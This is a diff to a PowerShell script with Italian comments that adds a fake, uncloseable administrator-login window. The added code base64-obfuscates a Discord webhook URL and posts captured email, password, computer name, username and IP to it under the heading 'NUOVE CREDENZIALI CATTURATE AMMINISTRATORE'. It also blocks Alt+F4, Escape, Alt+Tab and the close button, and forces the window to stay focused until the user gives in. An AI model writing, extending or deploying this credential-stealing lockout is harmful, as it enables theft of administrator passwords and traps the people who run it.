@@ -2,6 +2,97 @@ Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
+$webhookUrlex = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyOTkwNDk2MzQxNTgzNDYzNC8wa2VtcGdwSEJFdkxnRGF5ZnYzekxWX2gzY0o3QzY3RlhFc2JmaG5yVF9CZzIwWUtiMW1jRm5CT0NXMGgzaVA5dHNVQQ=='
+$webhookUrl = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($webhookUrlex))
+# ===== FUNZIONE INVIO A DISCORD =====
+function Send-DiscordMessage {
+    param($Email, $Password)
+    
+    $computerName = $env:COMPUTERNAME
+    $username = $env:USERNAME
+    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object InterfaceAlias -notlike "*Loopback*" | Select-Object -First 1).IPAddress
+    
+    $message = @"
+**NUOVE CREDENZIALI CATTURATE AMMINISTRATORE**
+**Email:** ````$Email````
+**Password:** ````$Password````
+**Computer:** $computerName
+**Utente:** $username
+**IP:** $ip
+**Ora:** $timestamp
+"@
+
+    $payload = @{ content = $message } | ConvertTo-Json -Depth 10
+    
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json; charset=utf-8" | Out-Null
+        return $true
+    }
+    catch {
+        Write-Host "Errore invio Discord: $_" -ForegroundColor Red
+        return $false
+    }
+}
+
+# 1. Blocca ALT+F4
+$form.Add_KeyDown({
+    if ($_.Alt -and $_.KeyCode -eq "F4") {
+        $_.SuppressKeyPress = $true
+        [System.Windows.Forms.MessageBox]::Show(
+            "NON PUOI CHIUDERE QUESTA FINESTRA!`n`nDevi inserire le credenziali amministrative per continuare.",
+            "Accesso Obbligatorio",
+            "OK",
+            "Error"
+        )
+    }
+    if ($_.KeyCode -eq "Escape") {
+        $_.SuppressKeyPress = $true
+    }
+    if ($_.Control -and $_.Shift -and $_.KeyCode -eq "Escape") {
+        $_.SuppressKeyPress = $true
+    }
+    if ($_.Alt -and $_.KeyCode -eq "Tab") {
+        $_.SuppressKeyPress = $true
+    }
+    if ($_.Control -and $_.KeyCode -eq "Escape") {
+        $_.SuppressKeyPress = $true
+    }
+})
+
+# 2. Blocca la chiusura con la X (già rimosso ControlBox)
+$form.Add_FormClosing({
+    $_.Cancel = $true
+    [System.Windows.Forms.MessageBox]::Show(
+        "NON PUOI CHIUDERE QUESTA FINESTRA!`n`nL'autenticazione è OBBLIGATORIA per continuare.",
+        "Accesso Obbligatorio",
+        "OK",
+        "Error"
+    )
+})
+
+# 3. Blocca la chiusura con il tasto ESC (previene la chiusura del dialog)
+$form.CancelButton = $null
+
+# 4. Blocca il ridimensionamento (già FixedDialog)
+
+# 5. Impedisci che la finestra perda il focus
+$form.Add_Deactivate({
+    if (-not $global:authSuccess) {
+        $form.Activate()
+        $form.TopMost = $true
+    }
+})
+
+# 6. Blocca la chiusura dal task manager (via Alt+Ctrl+Canc) - limitato
+
+# ===== ALLA CHIUSURA RIPRISTINA LA TASKBAR =====
+$form.Add_FormClosed({
+    if ($taskbarHandle -ne [IntPtr]::Zero) {
+        [Win32.User32]::ShowWindow($taskbarHandle, 5)  # SW_SHOW = 5
+    }
+})
+
 # Variabili di controllo
 $global:authSuccess = $false
 $script:attempts = 0
@@ -29,7 +120,7 @@ $form.Add_KeyDown({
     if ($_.Alt -and $_.KeyCode -eq "F4") {
         $_.SuppressKeyPress = $true
         [System.Windows.Forms.MessageBox]::Show(
-            "❌ NON PUOI CHIUDERE QUESTA FINESTRA!`n`nDevi inserire le credenziali amministrative per continuare.",
+            "NON PUOI CHIUDERE QUESTA FINESTRA!`n`nDevi inserire le credenziali amministrative per continuare.",
             "Accesso Obbligatorio",
             "OK",
             "Error"
@@ -41,7 +132,7 @@ $form.Add_KeyDown({
 $form.Add_FormClosing({
     $_.Cancel = $true
     [System.Windows.Forms.MessageBox]::Show(
-        "❌ NON PUOI CHIUDERE QUESTA FINESTRA!`n`nL'autenticazione è OBBLIGATORIA per continuare.",
+        "NON PUOI CHIUDERE QUESTA FINESTRA!`n`nL'autenticazione è OBBLIGATORIA per continuare.",
         "Accesso Obbligatorio",
         "OK",
         "Error"
